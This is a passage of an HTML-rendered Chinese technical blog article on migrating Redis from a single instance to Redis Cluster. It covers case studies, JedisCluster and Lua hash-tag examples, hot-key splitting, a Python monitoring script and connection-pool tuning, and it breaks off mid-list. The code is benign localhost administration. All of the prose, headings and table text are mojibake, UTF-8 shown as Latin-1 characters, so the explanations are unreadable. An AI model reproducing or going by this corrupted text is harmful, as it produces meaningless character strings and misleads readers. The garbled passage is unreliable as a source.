<pre><code class="hljs language-css" lang="css">å•æœº --&gt; <span class="hljs-selector-attr">[ä¸»ä»å¤åˆ¶]</span> --&gt; <span class="hljs-selector-attr">[å“¨å…µé«˜å¯ç”¨]</span> --&gt; <span class="hljs-selector-attr">[é›†ç¾¤åˆ†å¸ƒå¼]</span>
  |          |               |                 |
ç®€å•é«˜æ•ˆ   è¯»å†™åˆ†ç¦»       è‡ªåŠ¨æ•…éšœè½¬ç§»       å®¹é‡ä¸æ€§èƒ½æ‰©å±•
</code></pre>
<h3 data-id="heading-27">å®é™…é¡¹ç›®æ¡ˆä¾‹</h3>
<h4 data-id="heading-28">æ¡ˆä¾‹1ï¼šç¤¾äº¤å¹³å°ç”¨æˆ·ç¼“å­˜è¿ç§»</h4>
<p>åœ¨ä¸€ä¸ªç¤¾äº¤å¹³å°é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬æœ€åˆä½¿ç”¨å•æœºRediså­˜å‚¨ç”¨æˆ·ä¼šè¯æ•°æ®ã€‚éšç€ç”¨æˆ·é‡ä»10ä¸‡å¢é•¿åˆ°100ä¸‡ï¼Œå•æœºå†…å­˜å‘Šæ€¥ï¼Œè¿ç§»åˆ°é›†ç¾¤åŠ¿åœ¨å¿…è¡Œã€‚<br/>
<strong>è¿ç§»æ­¥éª¤</strong>ï¼š</p>
<ol>
<li><strong>æ•°æ®é¢„åˆ†ç‰‡</strong>ï¼šåœ¨æ–°é›†ç¾¤ä¸­é¢„å…ˆåˆ†é…æ§½ï¼Œè¿è¡Œè„šæœ¬å°†å•æœºæ•°æ®æŒ‰é”®å“ˆå¸Œåˆ†ç‰‡å¯¼å…¥ã€‚</li>
<li><strong>å®¢æˆ·ç«¯åˆ‡æ¢</strong>ï¼šæ›´æ–°Java Jediså®¢æˆ·ç«¯ä¸ºé›†ç¾¤æ¨¡å¼ï¼Œé€æ­¥åˆ‡æ¢æµé‡ã€‚<br/>
<strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> redis.clients.jedis.HostAndPort;
<span class="hljs-keyword">import</span> redis.clients.jedis.JedisCluster;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JedisClusterExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Set&lt;HostAndPort&gt; nodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
        nodes.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">7000</span>));
        nodes.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">7001</span>));
        nodes.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">7002</span>));

        <span class="hljs-keyword">try</span> (<span class="hljs-type">JedisCluster</span> <span class="hljs-variable">jedis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisCluster</span>(nodes)) {
            jedis.set(<span class="hljs-string">"user:123"</span>, <span class="hljs-string">"session_data"</span>);
            System.out.println(<span class="hljs-string">"Get user:123: "</span> + jedis.get(<span class="hljs-string">"user:123"</span>));
        }
    }
}
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼š<code>JedisCluster</code>è‡ªåŠ¨å¤„ç†æ§½å®šä½å’Œé‡å®šå‘ï¼Œå¼€å‘è€…æ— éœ€æ‰‹åŠ¨å¹²é¢„ã€‚<br/>
<strong>ç»“æœ</strong>ï¼šè¿ç§»åï¼Œç³»ç»Ÿå®¹é‡æå‡3å€ï¼Œå“åº”æ—¶é—´ç¨³å®šåœ¨1msä»¥å†…ã€‚</li>
</ul>
<h4 data-id="heading-29">æ¡ˆä¾‹2ï¼šå®æ—¶æ’è¡Œæ¦œç³»ç»Ÿä¼˜åŒ–</h4>
<p>åœ¨ä¸€ä¸ªæ¸¸æˆæ’è¡Œæ¦œç³»ç»Ÿä¸­ï¼Œå•æœºRediså› çƒ­ç‚¹Keyï¼ˆå¦‚å…¨å±€æ’è¡Œæ¦œï¼‰é¢‘ç¹æ›´æ–°è€Œæ€§èƒ½ä¸‹é™ã€‚æˆ‘ä»¬è¿ç§»åˆ°é›†ç¾¤å¹¶ä¼˜åŒ–çƒ­ç‚¹é—®é¢˜ã€‚<br/>
<strong>ä¼˜åŒ–æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li><strong>Keyåˆ†ç‰‡</strong>ï¼šå°†æ’è¡Œæ¦œæŒ‰ç”¨æˆ·IDåˆ†ç‰‡ï¼ˆå¦‚<code>rank:user:123</code>ï¼‰ï¼Œåˆ†æ•£åˆ°ä¸åŒæ§½ã€‚</li>
<li><strong>æœ¬åœ°ç¼“å­˜</strong>ï¼šå®¢æˆ·ç«¯å¼•å…¥Guava Cacheç¼“å­˜çƒ­ç‚¹æ•°æ®ï¼Œå‡å°‘Redisè¯·æ±‚ã€‚<br/>
<strong>æ•ˆæœ</strong>ï¼šçƒ­ç‚¹èŠ‚ç‚¹QPSä»10ä¸‡é™åˆ°2ä¸‡ï¼Œæ•´ä½“æ€§èƒ½æå‡50%ã€‚</li>
</ol>
<h3 data-id="heading-30">è¸©å‘ç»éªŒ</h3>
<ol>
<li>
<p><strong>MOVED/ASKé‡å®šå‘é—®é¢˜</strong><br/>
åœ¨è¿ç§»åˆæœŸï¼Œéƒ¨åˆ†å®¢æˆ·ç«¯æœªæ­£ç¡®å¤„ç†é›†ç¾¤è¿”å›çš„<code>MOVED</code>æˆ–<code>ASK</code>é‡å®šå‘ï¼Œå¯¼è‡´è¯·æ±‚å¤±è´¥ã€‚<br/>
<strong>è§£å†³åŠæ³•</strong>ï¼šç¡®ä¿å®¢æˆ·ç«¯ï¼ˆå¦‚Jedisï¼‰æ”¯æŒé›†ç¾¤æ¨¡å¼ï¼Œå¹¶é…ç½®åˆç†çš„é‡è¯•ç­–ç•¥ã€‚<br/>
<strong>æ•™è®­</strong>ï¼šè¿ç§»å‰è¦å……åˆ†æµ‹è¯•å®¢æˆ·ç«¯å…¼å®¹æ€§ã€‚</p>
</li>
<li>
<p><strong>Pipelineä½¿ç”¨çš„æ³¨æ„äº‹é¡¹</strong><br/>
åœ¨é›†ç¾¤æ¨¡å¼ä¸‹ï¼ŒPipelineæ— æ³•è·¨æ§½æ‰¹é‡æ“ä½œï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚<br/>
<strong>è§£å†³åŠæ³•</strong>ï¼šå°†Pipelineæ“ä½œæ‹†åˆ†ä¸ºå•æ§½è¯·æ±‚ï¼Œæˆ–æ”¹ç”¨Luaè„šæœ¬ã€‚<br/>
<strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- Luaè„šæœ¬ç¤ºä¾‹ï¼šæ‰¹é‡æ“ä½œåŒä¸€æ§½çš„é”®</span>
<span class="hljs-keyword">local</span> keys = KEYS
<span class="hljs-keyword">for</span> i, key <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>(keys) <span class="hljs-keyword">do</span>
    redis.call(<span class="hljs-string">'SET'</span>, key, ARGV[i])
<span class="hljs-keyword">end</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">"OK"</span>
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼šç¡®ä¿<code>KEYS</code>ä¸­çš„é”®å±äºåŒä¸€æ§½ï¼Œé¿å…è·¨æ§½é”™è¯¯ã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-31">ç¤ºæ„å›¾ï¼šä»å•æœºåˆ°é›†ç¾¤çš„è¿ç§»</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[å•æœºRedis]</span> --&gt; <span class="hljs-selector-attr">[æ•°æ®å¯¼å‡º]</span> --&gt; <span class="hljs-selector-attr">[é›†ç¾¤é¢„åˆ†ç‰‡]</span> --&gt; <span class="hljs-selector-attr">[å®¢æˆ·ç«¯åˆ‡æ¢]</span> --&gt; <span class="hljs-selector-attr">[Redis Cluster]</span>
   |                |               |                 |                 |
å†…å­˜çˆ†æ»¡         åˆ†ç‰‡è„šæœ¬        æ§½åˆ†é…           JedisCluster      é«˜å¯ç”¨æ‰©å±•
</code></pre>
<hr/>
<h3 data-id="heading-32">å¯¹æ¯”è¡¨æ ¼ï¼šä¸åŒæ¨¡å¼çš„é€‚ç”¨åœºæ™¯</h3>



































<table><thead><tr><th><strong>æ¨¡å¼</strong></th><th><strong>ä¼˜ç‚¹</strong></th><th><strong>ç¼ºç‚¹</strong></th><th><strong>é€‚ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td>å•æœº</td><td>ç®€å•ã€é«˜æ€§èƒ½</td><td>å®¹é‡æœ‰é™ã€å•ç‚¹æ•…éšœ</td><td>å°å‹åº”ç”¨ã€æµ‹è¯•ç¯å¢ƒ</td></tr><tr><td>ä¸»ä»</td><td>è¯»å†™åˆ†ç¦»</td><td>ä¸»èŠ‚ç‚¹ä»æœ‰é™åˆ¶</td><td>ä¸­å‹è¯»å¤šå†™å°‘åœºæ™¯</td></tr><tr><td>å“¨å…µ</td><td>é«˜å¯ç”¨ã€è‡ªåŠ¨åˆ‡æ¢</td><td>å•ä¸»å®¹é‡ç“¶é¢ˆ</td><td>å¯¹å¯ç”¨æ€§è¦æ±‚é«˜çš„åº”ç”¨</td></tr><tr><td>é›†ç¾¤</td><td>åˆ†å¸ƒå¼ã€é«˜æ‰©å±•æ€§</td><td>é…ç½®ç¨å¤æ‚</td><td>å¤§è§„æ¨¡ã€é«˜å¹¶å‘ç³»ç»Ÿ</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-33">è¿‡æ¸¡æ®µ</h3>
<p>é€šè¿‡ä»¥ä¸Šæ¡ˆä¾‹å’Œç»éªŒï¼Œæˆ‘ä»¬çœ‹åˆ°äº†Redisä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æ‰©å±•è·¯å¾„ï¼Œæ—¢æœ‰æŠ€æœ¯çš„æ¸è¿›æ¼”åŒ–ï¼Œä¹Ÿæœ‰å®è·µä¸­çš„æ‘¸ç´¢ä¼˜åŒ–ã€‚ä½†é›†ç¾¤çš„æ½œåŠ›è¿œä¸æ­¢äºæ­¤ï¼Œå¦‚ä½•è¿›ä¸€æ­¥æŒ–æ˜å…¶é«˜çº§åŠŸèƒ½å¹¶ä¼˜åŒ–æ€§èƒ½ï¼Œå°†æ˜¯æˆ‘ä»¬ä¸‹ä¸€èŠ‚çš„é‡ç‚¹ã€‚è®©æˆ‘ä»¬ç»§ç»­æ¢ç´¢Redisé›†ç¾¤çš„é«˜çº§åº”ç”¨ä¸ä¼˜åŒ–æŠ€å·§ã€‚</p>
<hr/>
<h2 data-id="heading-34">6. Redisé›†ç¾¤çš„é«˜çº§åº”ç”¨ä¸ä¼˜åŒ–</h2>
<p>Redisé›†ç¾¤æ­å»ºå®Œæˆå¹¶æŠ•å…¥ä½¿ç”¨åï¼Œä»…ä»…æ˜¯è¿ˆå‡ºäº†åˆ†å¸ƒå¼å®è·µçš„ç¬¬ä¸€æ­¥ã€‚è¦çœŸæ­£å‘æŒ¥å®ƒçš„æ½œåŠ›ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é«˜çº§åŠŸèƒ½åº”ç”¨å’Œæ€§èƒ½ä¼˜åŒ–ä¸Šä¸‹åŠŸå¤«ã€‚è¿™ä¸€èŠ‚ï¼Œæˆ‘å°†åˆ†äº«ä¸€äº›é›†ç¾¤æ¨¡å¼ä¸‹çš„è¿›é˜¶ç”¨æ³•ã€ä¼˜åŒ–æŠ€å·§ä»¥åŠè¿ç»´ç»éªŒï¼Œå¸®åŠ©ä½ åœ¨å®é™…é¡¹ç›®ä¸­å°†Redisé›†ç¾¤â€œè°ƒæ•™â€å¾—æ›´å‡ºè‰²ã€‚</p>
<h3 data-id="heading-35">é«˜çº§åŠŸèƒ½åº”ç”¨</h3>
<ol>
<li>
<p><strong>Luaè„šæœ¬åœ¨é›†ç¾¤ä¸­çš„ä½¿ç”¨ä¸é™åˆ¶</strong><br/>
Luaè„šæœ¬æ˜¯Redisçš„æ€æ‰‹é”ä¹‹ä¸€ï¼Œèƒ½åŸå­åŒ–æ‰§è¡Œå¤æ‚é€»è¾‘ã€‚ä½†åœ¨é›†ç¾¤æ¨¡å¼ä¸‹ï¼Œè„šæœ¬ä¸­çš„æ‰€æœ‰é”®å¿…é¡»å±äºåŒä¸€æ§½ï¼Œå¦åˆ™ä¼šæŠ¥é”™<code>CROSSSLOT</code>ã€‚<br/>
<strong>è§£å†³åŠæ³•</strong>ï¼šä½¿ç”¨å“ˆå¸Œæ ‡ç­¾ï¼ˆHash Tagï¼‰ï¼Œå¦‚<code>{user}.name</code>å’Œ<code>{user}.score</code>ï¼Œç¡®ä¿é”®æ˜ å°„åˆ°åŒä¸€æ§½ã€‚<br/>
<strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-comment">-- è®¾ç½®ç”¨æˆ·å§“åå’Œåˆ†æ•°ï¼Œç¡®ä¿åŒä¸€æ§½</span>
<span class="hljs-keyword">local</span> name_key = KEYS[<span class="hljs-number">1</span>]  <span class="hljs-comment">-- {user:123}.name</span>
<span class="hljs-keyword">local</span> score_key = KEYS[<span class="hljs-number">2</span>] <span class="hljs-comment">-- {user:123}.score</span>
redis.call(<span class="hljs-string">'SET'</span>, name_key, ARGV[<span class="hljs-number">1</span>])
redis.call(<span class="hljs-string">'SET'</span>, score_key, ARGV[<span class="hljs-number">2</span>])
<span class="hljs-keyword">return</span> <span class="hljs-string">"OK"</span>
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼šé€šè¿‡<code>{}</code>å®šä¹‰å“ˆå¸Œæ ‡ç­¾ï¼Œæ§åˆ¶æ§½åˆ†é…ã€‚</li>
</ul>
</li>
<li>
<p><strong>äº‹åŠ¡ï¼ˆMULTI/EXECï¼‰çš„æ›¿ä»£æ–¹æ¡ˆ</strong><br/>
é›†ç¾¤æ¨¡å¼ä¸æ”¯æŒè·¨æ§½çš„äº‹åŠ¡ï¼Œä¼ ç»Ÿçš„<code>MULTI/EXEC</code>å—é™ã€‚<br/>
<strong>æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼šå°†äº‹åŠ¡é€»è¾‘æ”¹ä¸ºLuaè„šæœ¬ï¼Œæˆ–é€šè¿‡å®¢æˆ·ç«¯åˆ†æ­¥æ“ä½œ+è¡¥å¿æœºåˆ¶å®ç°ã€‚<br/>
<strong>ç»éªŒ</strong>ï¼šå¯¹äºç®€å•é€»è¾‘ï¼Œä¼˜å…ˆé€‰æ‹©Luaï¼Œæ—¢é«˜æ•ˆåˆåŸå­åŒ–ã€‚</p>
</li>
</ol>
<h3 data-id="heading-36">æ€§èƒ½ä¼˜åŒ–</h3>
<ol>
<li>
<p><strong>æ‰¹é‡æ“ä½œå‡å°‘ç½‘ç»œå¼€é”€</strong><br/>
å•æ¬¡è¯·æ±‚çš„ç½‘ç»œå»¶è¿Ÿåœ¨é›†ç¾¤ä¸­ä¼šè¢«æ”¾å¤§ï¼Œæ‰¹é‡æ“ä½œæ˜¯ä¼˜åŒ–åˆ©å™¨ã€‚<br/>
<strong>å®è·µ</strong>ï¼šç”¨<code>MSET</code>æ›¿ä»£å¤šæ¬¡<code>SET</code>ï¼Œæˆ‘åœ¨ä¸€ä¸ªæ—¥å¿—ç³»ç»Ÿä¸­å°†å†™å…¥å»¶è¿Ÿä»5msé™åˆ°1msã€‚<br/>
<strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">redis-cli -p 7000 MSET key1 val1 key2 val2 key3 val3
</code></pre>
</li>
<li>
<p><strong>çƒ­ç‚¹Keyæ£€æµ‹ä¸åˆ†æ•£</strong><br/>
çƒ­ç‚¹Keyä¼šå¯¼è‡´æŸèŠ‚ç‚¹è´Ÿè½½è¿‡é«˜ã€‚<br/>
<strong>è§£å†³åŠæ³•</strong>ï¼š</p>
<ul>
<li>é€šè¿‡<code>redis-cli --hotkeys</code>æ£€æµ‹çƒ­ç‚¹ã€‚</li>
<li>å°†çƒ­ç‚¹Keyæ‹†åˆ†ä¸ºå¤šä¸ªå­Keyï¼ˆå¦‚<code>hotkey:part1</code>ã€<code>hotkey:part2</code>ï¼‰ï¼Œåˆ†æ•£è¯·æ±‚ã€‚<br/>
<strong>æ•ˆæœ</strong>ï¼šä¸€ä¸ªå®æ—¶ç»Ÿè®¡é¡¹ç›®ä¸­ï¼Œçƒ­ç‚¹èŠ‚ç‚¹QPSä»8ä¸‡é™åˆ°3ä¸‡ï¼Œè´Ÿè½½å‡è¡¡æ˜¾è‘—æ”¹å–„ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-37">ç›‘æ§ä¸è¿ç»´</h3>
<p>é›†ç¾¤çš„ç¨³å®šè¿è¡Œç¦»ä¸å¼€ç›‘æ§ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸ç”¨æŒ‡æ ‡å’Œå·¥å…·ï¼š</p>
<ul>
<li><strong>å…³é”®æŒ‡æ ‡</strong>ï¼š
<ul>
<li><strong>æ§½åˆ†å¸ƒ</strong>ï¼š<code>cluster slots</code>æ£€æŸ¥æ˜¯å¦å‡åŒ€ã€‚</li>
<li><strong>èŠ‚ç‚¹å»¶è¿Ÿ</strong>ï¼šé€šè¿‡<code>PING</code>æµ‹è¯•å“åº”æ—¶é—´ã€‚</li>
<li><strong>å†…å­˜ä½¿ç”¨ç‡</strong>ï¼š<code>INFO MEMORY</code>æŸ¥çœ‹<code>used_memory</code>ã€‚</li>
</ul>
</li>
<li><strong>ä»£ç ç¤ºä¾‹ï¼šPythonç›‘æ§è„šæœ¬</strong>ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis

<span class="hljs-keyword">def</span> <span class="hljs-title function_">monitor_cluster</span>(<span class="hljs-params">host, port</span>):
    r = redis.Redis(host=host, port=port)
    cluster_info = r.cluster_info()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Cluster State: <span class="hljs-subst">{cluster_info[<span class="hljs-string">'cluster_state'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Slots Assigned: <span class="hljs-subst">{cluster_info[<span class="hljs-string">'cluster_slots_assigned'</span>]}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Known Nodes: <span class="hljs-subst">{cluster_info[<span class="hljs-string">'cluster_known_nodes'</span>]}</span>"</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    monitor_cluster(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">7000</span>)
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼šè„šæœ¬å®šæœŸæ£€æŸ¥é›†ç¾¤çŠ¶æ€ï¼Œå‘ç°å¼‚å¸¸åŠæ—¶å‘Šè­¦ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-38">æœ€ä½³å®è·µ</h3>
<ol>
<li>
<p><strong>é¢„åˆ†ç‰‡é™ä½æ‰©å®¹æˆæœ¬</strong><br/>
åœ¨ä¸€ä¸ªå¹¿å‘Šç³»ç»Ÿé¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬é¢„å…ˆéƒ¨ç½²äº†6ä¸ªèŠ‚ç‚¹ï¼Œä½†åªä½¿ç”¨3ä¸ªä¸»èŠ‚ç‚¹ï¼Œæ§½åˆ†é…ç•™æœ‰ä½™é‡ã€‚åæ¥æµé‡å¢é•¿æ—¶ï¼Œç›´æ¥å¯ç”¨å¤‡ç”¨èŠ‚ç‚¹ï¼Œè¿ç§»æˆæœ¬å‡ ä¹ä¸ºé›¶ã€‚<br/>
<strong>å»ºè®®</strong>ï¼šåˆæœŸå¤šéƒ¨ç½²èŠ‚ç‚¹ï¼Œæ§½åˆ†é…é¢„ç•™æ‰©å±•ç©ºé—´ã€‚</p>
</li>
<li>
<p><strong>è¸©å‘åˆ†äº«ï¼šè¿æ¥æ± é…ç½®å¤±è¯¯</strong><br/>
æœ‰ä¸€æ¬¡å› å®¢æˆ·ç«¯è¿æ¥æ± é…ç½®ä¸å½“ï¼ˆæœ€å¤§è¿æ¥æ•°è®¾ä¸º10ï¼‰ï¼Œé«˜å³°æœŸè¯·æ±‚æ’é˜Ÿå¯¼è‡´å»¶è¿Ÿæ¿€å¢ã€‚<br/>
<strong>è§£å†³åŠæ³•</strong>ï¼šè°ƒæ•´Jedisè¿æ¥æ± å‚æ•°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">JedisPoolConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisPoolConfig</span>();
config.setMaxTotal(<span class="hljs-number">100</span>); <span class="hljs-comment">// æœ€å¤§è¿æ¥æ•°</span>
config.setMaxIdle(<span class="hljs-number">20</span>);   <span class="hljs-comment">// æœ€å¤§ç©ºé—²è¿æ¥</span>
</code></pre>
<p><strong>æ•™è®­</strong>ï¼šè¿æ¥æ± è¦æ ¹æ®QPSé¢„ä¼°åˆç†é…ç½®ï¼Œé¿å…æˆä¸ºç“¶é¢ˆã€‚</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-39">ç¤ºæ„å›¾ï¼šçƒ­ç‚¹Keyåˆ†æ•£ç­–ç•¥</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[çƒ­ç‚¹Key: <span class="hljs-string">"stats"</span>]</span> --&gt; åˆ†æ•£ä¸º --&gt; <span class="hljs-selector-attr">[stats:part1]</span> <span class="hljs-selector-attr">[stats:part2]</span> <span class="hljs-selector-attr">[stats:part3]</span>
      |                                 |           |           |
    é«˜è´Ÿè½½                            èŠ‚ç‚¹<span class="hljs-selector-tag">A</span>       èŠ‚ç‚¹<span class="hljs-selector-tag">B</span>       èŠ‚ç‚¹C
</code></pre>
<p><strong>è¯´æ˜</strong>ï¼šå°†å•ä¸€çƒ­ç‚¹Keyæ‹†åˆ†ï¼Œè´Ÿè½½å‡åŒ€åˆ†å¸ƒåˆ°å¤šä¸ªèŠ‚ç‚¹ã€‚</p>
<hr/>
<h3 data-id="heading-40">ä¼˜åŒ–æ•ˆæœå¯¹æ¯”è¡¨æ ¼</h3>





























<table><thead><tr><th><strong>ä¼˜åŒ–æ‰‹æ®µ</strong></th><th><strong>ä¼˜åŒ–å‰</strong></th><th><strong>ä¼˜åŒ–å</strong></th><th><strong>æ•ˆæœ</strong></th></tr></thead><tbody><tr><td>æ‰¹é‡æ“ä½œ</td><td>5ms/æ¬¡</td><td>1ms/æ¬¡</td><td>å»¶è¿Ÿé™ä½80%</td></tr><tr><td>çƒ­ç‚¹Keyåˆ†æ•£</td><td>å•èŠ‚ç‚¹8ä¸‡QPS</td><td>å„èŠ‚ç‚¹3ä¸‡QPS</td><td>è´Ÿè½½å‡è¡¡æå‡60%</td></tr><tr><td>é¢„åˆ†ç‰‡æ‰©å®¹</td><td>è¿ç§»è€—æ—¶2å°æ—¶</td><td>è¿ç§»è€—æ—¶5åˆ†é’Ÿ</td><td>æ‰©å®¹æ•ˆç‡æå‡95%</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-41">è¿‡æ¸¡æ®µ</h3>
<p>é€šè¿‡é«˜çº§åŠŸèƒ½å’Œä¼˜åŒ–æŠ€å·§ï¼ŒRedisé›†ç¾¤çš„æ€§èƒ½å’Œç¨³å®šæ€§å¾—åˆ°äº†è¿›ä¸€æ­¥æå‡ã€‚ä½†æŠ€æœ¯çš„ä»·å€¼æœ€ç»ˆä½“ç°åœ¨ä¸šåŠ¡æ”¯æŒä¸Šã€‚ä»å•æœºåˆ°åˆ†å¸ƒå¼çš„è¿™æ¡è·¯ï¼Œæˆ‘ä»¬å·²ç»èµ°äº†å¾ˆè¿œï¼Œæ¥ä¸‹æ¥æ˜¯æ—¶å€™æ€»ç»“ç»éªŒï¼Œå¹¶å±•æœ›Redisçš„æœªæ¥å‘å±•äº†ã€‚æœ€åä¸€èŠ‚ï¼Œæˆ‘ä»¬å°†å›é¡¾è¿™æ®µæ—…ç¨‹ï¼Œå¹¶ç»™å‡ºå®è·µå»ºè®®ã€‚</p>
<hr/>
<h2 data-id="heading-42">7. æ€»ç»“ä¸å±•æœ›</h2>
<p>ä»å•æœºRedisçš„ç®€å•é«˜æ•ˆï¼Œåˆ°åˆ†å¸ƒå¼é›†ç¾¤çš„å¼ºå¤§æ‰©å±•ï¼Œæˆ‘ä»¬ä¸€è·¯èµ°æ¥ï¼Œè§è¯äº†Rediså¦‚ä½•ä»ä¸€åŒ¹ç‹¬ç‹¼è¿›åŒ–ä¸ºä¸€æ”¯ååŒä½œæˆ˜çš„ç‹¼ç¾¤ã€‚è¿™ç¯‡æ–‡ç« å¸¦ä½ ç©¿è¶Šäº†ä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æŠ€æœ¯æ¼”è¿›ä¹‹è·¯ï¼Œå‰–æäº†Redis Clusterçš„æ ¸å¿ƒæ¦‚å¿µã€æ­å»ºæ–¹æ³•å’Œä¼˜åŒ–å®è·µã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬åœä¸‹è„šæ­¥ï¼Œå›é¡¾è¿™æ®µæ—…ç¨‹çš„æ”¶è·ï¼Œå¹¶å±•æœ›Redisåœ¨æœªæ¥çš„å¯èƒ½æ€§ã€‚</p>
<h3 data-id="heading-43">æ€»ç»“</h3>
<p>Redisé›†ç¾¤æ¶æ„çš„æ ¸å¿ƒä»·å€¼å¯ä»¥ç”¨ä¸‰ä¸ªè¯æ¦‚æ‹¬ï¼š<strong>é«˜æ€§èƒ½ã€é«˜å¯ç”¨ã€å¯æ‰©å±•</strong>ã€‚å®ƒé€šè¿‡æ•°æ®åˆ†ç‰‡çªç ´äº†å•æœºå†…å­˜çš„é™åˆ¶ï¼Œç”¨ä¸»ä»å¤åˆ¶å’Œæ•…éšœè½¬ç§»ä¿éšœäº†æœåŠ¡çš„ç¨³å®šæ€§ï¼Œè¿˜ä»¥åŠ¨æ€æ‰©ç¼©å®¹ä¸ºä¸šåŠ¡å¢é•¿æä¾›äº†æ— é™å¯èƒ½ã€‚ä»å•æœºåˆ°ä¸»ä»ï¼Œå†åˆ°å“¨å…µå’Œé›†ç¾¤ï¼Œæ¯ä¸€æ­¥éƒ½åœ¨è§£å†³ç‰¹å®šçš„ç—›ç‚¹ï¼š</p>
<ul>
<li>å•æœºæ¨¡å¼é€‚åˆå°è§„æ¨¡å¿«é€Ÿå¼€å‘ï¼›</li>
<li>ä¸»ä»å¤åˆ¶åˆ†æ‹…è¯»å‹åŠ›ï¼›</li>
<li>å“¨å…µæ¨¡å¼æå‡å¯ç”¨æ€§ï¼›</li>
<li>é›†ç¾¤æ¨¡å¼åˆ™ä¸ºå¤§è§„æ¨¡ã€é«˜å¹¶å‘åœºæ™¯é‡èº«å®šåˆ¶ã€‚</li>
</ul>
<p>åœ¨æˆ‘çš„10å¹´Rediså¼€å‘ç»å†ä¸­ï¼Œä»æ—©æœŸå•æœºä¼˜åŒ–åˆ°å¦‚ä»Šé©¾é©­åˆ†å¸ƒå¼é›†ç¾¤ï¼Œæ¯ä¸€æ¬¡è½¬å‹éƒ½ä¼´éšç€ä¸šåŠ¡éœ€æ±‚çš„é©±åŠ¨å’ŒæŠ€æœ¯èƒ½åŠ›çš„æå‡ã€‚æ— è®ºæ˜¯ç¤¾äº¤å¹³å°çš„ç”¨æˆ·ç¼“å­˜ï¼Œè¿˜æ˜¯æ¸¸æˆç³»ç»Ÿçš„å®æ—¶æ’è¡Œæ¦œï¼ŒRedisé›†ç¾¤éƒ½ä»¥å…¶çµæ´»æ€§å’Œå¯é æ€§ï¼Œæˆä¸ºäº†ä¸å¯æˆ–ç¼ºçš„åŸºçŸ³ã€‚</p>
<h3 data-id="heading-44">å®è·µå»ºè®®</h3>
<p>åŸºäºè¿™äº›ç»éªŒï¼Œæˆ‘ä¸ºä¸åŒé˜¶æ®µçš„å¼€å‘è€…æå‡ ç‚¹å»ºè®®ï¼š</p>
<ol>
<li><strong>æ ¹æ®ä¸šåŠ¡è§„æ¨¡é€‰æ‹©æ¶æ„</strong>ï¼šå°å‹é¡¹ç›®ç”¨å•æœºæˆ–ä¸»ä»å³å¯ï¼Œä¸­å¤§å‹ç³»ç»Ÿå°½æ—©è§„åˆ’é›†ç¾¤ï¼Œé¿å…åæœŸè¿ç§»çš„éº»çƒ¦ã€‚</li>
<li><strong>å…³æ³¨ç»†èŠ‚ä¼˜åŒ–</strong>ï¼šæ§½åˆ†é…ã€çƒ­ç‚¹Keyã€è¿æ¥æ± é…ç½®ï¼Œè¿™äº›â€œå°äº‹â€å¾€å¾€å†³å®šé›†ç¾¤çš„æˆè´¥ã€‚</li>
